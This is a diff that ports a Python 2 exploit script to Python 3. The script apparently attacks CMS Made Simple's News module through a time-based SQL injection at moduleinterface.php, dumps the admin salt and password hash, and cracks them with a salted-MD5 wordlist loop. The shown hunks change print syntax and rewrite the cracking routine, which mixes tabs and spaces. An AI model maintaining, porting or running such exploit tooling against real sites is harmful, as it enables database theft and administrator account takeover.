--- cve.orig.py	2024-05-16 21:03:47.614654676 -0300
+++ cve.py	2024-05-16 20:46:51.626391185 -0300
@@ -22,10 +22,10 @@

 options, args = parser.parse_args()
 if not options.url:
-    print "[+] Specify an url target"
-    print "[+] Example usage (no cracking password): exploit.py -u http://target-uri"
-    print "[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist"
-    print "[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based."
+    print("[+] Specify an url target")
+    print ("[+] Example usage (no cracking password): exploit.py -u http://target-uri")
+    print("[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist")
+    print("[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.")
     exit()

 url_vuln = options.url + '/moduleinterface.php?mact=News,m1_,default,0'
@@ -49,24 +49,23 @@
     global output
     global wordlist
     global salt
-    dict = open(wordlist)
-    for line in dict.readlines():
-        line = line.replace("\n", "")
-        beautify_print_try(line)
-        if hashlib.md5(str(salt) + line).hexdigest() == password:
-            output += "\n[+] Password cracked: " + line
-            break
-    dict.close()
+    with open(wordlist,'r') as dic:
+    	for line in dic:
+        	line = line.strip()
+        	beautify_print_try(line)
+        	if hashlib.md5((str(salt) + line).encode()).hexdigest() == password:
+            		output += "\n[+] Password cracked: " + line
+            		break

 def beautify_print_try(value):
     global output
-    print "\033c"
+    print("\033c")
     cprint(output,'green', attrs=['bold'])
     cprint('[*] Try: ' + value, 'red', attrs=['bold'])

 def beautify_print():
     global output
-    print "\033c"
+    print("\033c")
     cprint(output,'green', attrs=['bold'])

 def dump_salt():
@@ -180,7 +179,7 @@
 dump_password()

 if options.cracking:
-    print colored("[*] Now try to crack password")
+    print(colored("[*] Now try to crack password"))
     crack_password()

 beautify_print()
